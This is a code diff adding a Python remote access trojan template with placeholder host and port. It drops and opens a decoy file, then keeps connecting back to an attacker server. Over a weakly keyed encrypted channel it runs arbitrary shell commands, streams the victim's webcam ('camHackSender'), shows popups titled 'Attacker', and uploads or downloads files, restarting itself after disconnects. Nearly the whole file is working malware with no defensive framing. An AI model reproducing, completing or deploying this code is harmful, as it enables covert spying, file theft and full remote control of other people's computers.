@@ -1,0 +1,444 @@
+import cv2
+import numpy as np
+import pickle
+import socket
+import time
+from threading import Thread
+import struct
+import os
+import subprocess
+import ctypes
+import hashlib 
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.fernet import Fernet
+import random
+import base64
+
+
+
+HOST='<HOST>'
+PORT=int('<PORT>')
+TWOSOCKETS=('<SOCKETS>'=='2')
+FILECONTENT=<CONTENT>
+FILENAME='<NAME>'
+salt=b'dew4ej2w254erf'
+g=9
+p=9999
+
+WindowsTemp='C:/Users/<user>/AppData/Local/Temp/'
+LinuxTemp='/tmp/'
+
+
+
+def diffie_hellman(s):
+	global g
+	global p
+	global salt
+	x=random.randint(1000, 9999)
+	X = str((g**x) % p)
+	s.sendall(X.encode())
+	y = int(s.recv(1024).decode())
+	password_provided = str((y**x) % p)
+	password = password_provided.encode()
+	kdf = PBKDF2HMAC(
+		algorithm=hashes.SHA256(),
+		length=32,
+		salt=salt,
+		iterations=100000,
+		backend=default_backend()
+	)
+	key = base64.urlsafe_b64encode(kdf.derive(password))
+	return key
+
+
+
+def getFolder():
+	system=os.name
+	res=''
+	if system=='posix':
+		global LinuxTemp
+		res=LinuxTemp
+	elif system=='nt':
+		global WindowsTemp
+		import getpass
+		user=getpass.getuser()
+		res=WindowsTemp.replace('<user>', user)
+	return res
+
+
+
+def base64ToFile(code, filename):
+	filename=getFolder()+filename
+	file=open(filename, 'wb')
+	content=base64.b64decode(code)
+	content=file.write(content)
+	file.close()
+	return filename
+
+
+
+
+class showFile(Thread):
+
+	def __init__(self, filename):
+		Thread.__init__(self)
+		self.filename=filename
+
+
+
+	def run(self):
+		os.startfile(self.filename)
+		removed=False
+		while not removed:
+			try:
+				os.remove(self.filename)
+				removed=True
+			except:
+				time.sleep(5)
+
+
+
+
+class showMessage(Thread):
+
+	def __init__(self, text, title='Attacker'):
+		Thread.__init__(self)
+		self.title=title
+		self.text=text
+
+
+
+	def run(self):
+		ctypes.windll.user32.MessageBoxW(0, self.text, self.title, 1)
+
+
+
+class camHackSender(Thread):
+
+	def __init__(self, host):
+		Thread.__init__(self)
+		self.host=host
+		self.port=8485
+		self.stop=False
+		self.socket=None
+		self.key=None
+
+
+
+	def checkConnection(self):
+		res=True
+		if not self.socket:
+			self.socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			try:
+				self.socket.connect((self.host, self.port))
+			except:
+				self.socket.close()
+				self.socket=None
+				res=False
+		return res
+
+
+
+	def startDaemon(self):
+		#self.setDaemon(True)
+		self.start()
+
+
+
+	def startWhenHostUp(self, sleep=5):
+		while not self.checkConnection() and not self.stop:
+			time.sleep(sleep)
+		if not self.stop:
+			self.startDaemon()
+
+
+
+	def encrypt(self, m):
+		f=Fernet(self.key)
+		enc=f.encrypt(m)
+		return enc
+
+
+
+	def run(self):
+		if self.checkConnection():
+			self.key=diffie_hellman(self.socket)
+			connection=self.socket.makefile('wb')
+			cam=cv2.VideoCapture(0)
+			encode_param=[int(cv2.IMWRITE_JPEG_QUALITY), 90]
+			ret, frame=cam.read()
+			while not self.stop and ret:
+				result, frame=cv2.imencode('.jpg', frame, encode_param)
+				data=pickle.dumps(frame, 0)
+				size=len(data)
+				msg=struct.pack(">L", size)+data
+				self.socket.sendall(self.encrypt(msg))
+				self.socket.recv(1024)
+				ret, frame=cam.read()
+			cam.release()
+			self.socket.close()
+			self.socket=None
+
+
+
+	def kill(self):
+		self.stop=True
+
+
+
+class Controller(Thread):
+	def __init__(self, host, port, twoSockets=False):
+		Thread.__init__(self)
+		self.serverHost=host
+		self.serverPort=port
+		self.port=9876
+		self.stop=False
+		self.socketS=None
+		self.socketR=None
+		self.conn=None
+		self.camera=None
+		self.keyS=None
+		self.keyR=None
+		self.twoSockets=twoSockets
+
+
+
+	def checkConnection(self):
+		res=True
+		if not self.socketS:
+			self.socketS=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			try:
+				self.socketS.connect((self.serverHost, self.serverPort))
+			except:
+				self.socketS.close()
+				self.socketS=None
+				res=False
+		return res
+
+
+
+	def startDaemon(self):
+		self.setDaemon(True)
+		self.start()
+
+
+
+	def startWhenHostUp(self, sleep=5):
+		while not self.checkConnection():
+			time.sleep(sleep)
+		self.start()
+
+
+
+	def startSender(self):
+		self.keyS=diffie_hellman(self.socketS)
+		if self.twoSockets:
+			self.send(str(self.port))
+
+
+
+	def startReciever(self):
+		if self.twoSockets:
+			self.socketR=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			self.socketR.bind(('localhost',self.port))
+			self.socketR.listen(1)
+			conn,addr=self.socketR.accept()
+			self.conn=conn
+			self.keyR=diffie_hellman(self.conn)
+		else:
+			self.socketR=self.socketS
+			self.conn=self.socketS
+			self.keyR=self.keyS
+
+
+
+	def encrypt(self, m):
+		f=Fernet(self.keyS)
+		enc=f.encrypt(m)
+		return enc
+
+
+
+	def decrypt(self, m):
+		f=Fernet(self.keyR)
+		dec=f.decrypt(m)
+		return dec
+
+
+
+	def send(self, msg):
+		if not msg:
+			msg='None'
+		if type(msg)!=type(b''):
+			msg=str(msg).encode('ascii')
+		n=str(len(msg)).encode('ascii')
+		self.socketS.sendall(self.encrypt(n))
+		self.conn.recv(4096)
+		self.socketS.sendall(self.encrypt(msg))
+
+
+
+	def recv(self):
+		res=self.conn.recv(4096)
+		res=self.decrypt(res)
+		res=res.decode('ascii')
+		n=int(res)
+		self.socketS.sendall(b'ok')
+		res=b''
+		aux=b''
+		while len(res.decode('ascii')) < n:
+			aux+=self.conn.recv(4096)
+			try:
+				res=self.decrypt(aux)
+			except:
+				continue
+		res=res.decode('ascii')
+		if res=='None':
+			res=''
+		return res
+
+
+
+	def recvFile(self):
+		res=self.conn.recv(4096)
+		res=self.decrypt(res)
+		res=res.decode('ascii')
+		n=int(res)
+		self.socketS.sendall(b'ok')
+		res=b''
+		aux=b''
+		while len(res) < n:
+			aux+=self.conn.recv(64000000)
+			try:
+				res=self.decrypt(aux)
+			except:
+				continue
+		return res
+
+
+
+	def close(self):
+		self.socketS.close()
+		self.socketR.close()
+
+
+
+	def run(self):
+		if self.checkConnection():
+			self.startSender()			
+			self.startReciever()
+			stop=False
+			restart=True
+			while not stop:
+				msg=self.recv()
+				res='not found: '+msg
+				if msg == 'system':
+					res='unknown'
+					if 'posix' in os.name:
+						res='Linux'
+					elif 'nt' in os.name:
+						res='Windows'
+				elif msg=='start cam':
+					print('entro')
+					if not self.camera:
+						self.camera=camHackSender(self.serverHost)
+						self.camera.startWhenHostUp()
+					res='[!] camera on'
+				elif msg=='stop cam':
+					if self.camera:
+						self.camera.kill()
+					self.camera=None
+					res='[!] camera off'
+				elif msg.startswith('msg '):
+					res='[-] Error creating popup'
+					popup=None
+					if ' -m ' in msg:
+						text=msg.split(' -m ')[-1].split(' -t ')[0]
+						if ' -t ' in msg:
+							title=msg.split(' -t ')[-1].split(' -m ')[0]
+							popup=showMessage(text, title)
+						else:
+							popup=showMessage(text)
+						popup.start()
+						res='[+] Message created'
+				elif msg.startswith('cd '):
+					dir=msg.replace('cd ', '')
+					res=''
+					try:
+						os.chdir(dir)
+					except:
+						res='[-] Directory not found'
+				elif msg=='upload file':
+					self.recieveFile()
+					continue
+				elif msg=='download file':
+					self.sendFile()
+					continue
+				elif msg=='exit':
+					res='bye'
+					stop=True
+				elif msg=='kill':
+					res='bye'
+					stop=True
+					restart=False
+				else:
+					p=subprocess.Popen(msg.split(), stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+					nice_stdout = open(os.dup(p.stdout.fileno()), newline='')
+					res=''
+					for line in nice_stdout:
+						res+=str(line)
+					aux=[]
+					for c in res:
+						try:
+							c.encode('ascii')
+						except:
+							c=' '
+						aux.append(c)
+					res=''.join(aux)
+				self.send(res)
+			if self.camera:
+				self.camera.kill()
+			self.socketS.close()
+			self.socketR.close()
+			if restart:
+				c=Controller(self.serverHost, self.serverPort, self.twoSockets)
+				c.startWhenHostUp()
+
+
+
+	def recieveFile(self):
+		self.send('ok')
+		fileName=self.recv()
+		print(fileName)
+		res='[+] File uploaded successfully'
+		self.send('ok')
+		content=self.recvFile()
+		file=open(fileName, 'wb')
+		file.write(content)
+		file.close()
+		if not os.path.exists(fileName):
+			res=['[-] Error uploading file']
+		self.send(res)
+
+
+
+	def sendFile(self):
+		self.send('ok')
+		fileName=self.recv()
+		if os.path.exists(fileName):
+			self.send('ok')
+			self.recv()
+			file=open(fileName, 'rb')
+			self.send(file.read())
+			file.close()
+		else:
+			self.send('error')
+		
+if FILENAME:
+	filename=base64ToFile(FILECONTENT, FILENAME)
+	file=showFile(filename)
+	file.start()
+c=Controller(HOST, PORT, TWOSOCKETS)
+c.startWhenHostUp()
